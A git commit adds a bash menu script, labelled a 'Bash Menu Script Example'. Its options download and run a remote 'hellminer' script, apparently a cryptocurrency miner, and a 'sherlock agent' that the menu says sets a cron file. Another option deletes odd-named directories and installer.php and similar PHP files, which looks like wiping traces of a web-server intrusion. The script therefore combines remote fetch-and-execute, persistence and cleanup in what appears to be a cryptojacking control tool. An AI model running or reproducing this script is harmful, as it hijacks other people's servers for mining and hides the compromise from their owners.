bc4302c0341cdee0ef6ed6eaf4f2c8c75b2b3d48
bitcloudson <37044071+bitcloudson@users.noreply.github.com>
2022-02-02 13:16:50 +0800

    Add files via upload

---
+++ pl/control_menu.sh
@@ -0,0 +1,69 @@
+#!/bin/bash
+# Bash Menu Script Example
+
+
+function exec_hellminer() {
+    wget https://github.com/bitcloudson/rapidtools/raw/main/pl/start_hellminer.sh -O ./start_hellminer.sh
+    bash start_hellminer.sh $1
+}
+
+
+function exec_sherlock_agent() {
+    wget https://github.com/bitcloudson/rapidtools/raw/main/pl/start_sherlock_agent.sh -O ./start_sherlock_agent.sh
+    bash start_sherlock_agent.sh
+}
+
+function exec_clear() {
+    if [ -d "./zx13b4911111" ]; then
+        echo "./zx13b4911111 exist!"
+        rm ./zx13b4911111 -rf
+    fi
+
+    if [ -d "../zx13b4911111" ]; then
+        echo "../zx13b4911111 exist!"
+        rm ../zx13b4911111 -rf
+    fi
+
+    if [ -f "./installer.php" ]; then
+        unlink ./installer.php
+    fi
+
+    if [ -f "../installer.php" ]; then
+        unlink ../installer.php
+    fi
+
+    if [ -f "./zx13b4911111.php" ]; then
+        unlink ./zx13b4911111.php
+    fi
+
+    if [ -f "../zx13b4911111.php" ]; then
+        unlink ../zx13b4911111.php
+    fi
+
+    
+}
+
+
+PS3='Please enter your choice: '
+options=("Exec Hellminer" "Set Sherlock Agent" "Clear" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+        "Exec Hellminer")
+            echo "you chose execute Start Hellminer [Woker Name: $1]"
+            exec_hellminer $1
+            ;;
+        "Set Sherlock Agent")
+            echo "you chose Set Sherlock Agent and Cron File"
+            exec_sherlock_agent
+            ;;
+        "Clear")
+            echo "you chose choice $REPLY which is $opt"
+            exec_clear
+            ;;
+        "Quit")
+            break
+            ;;
+        *) echo "invalid option $REPLY";;
+    esac
+done
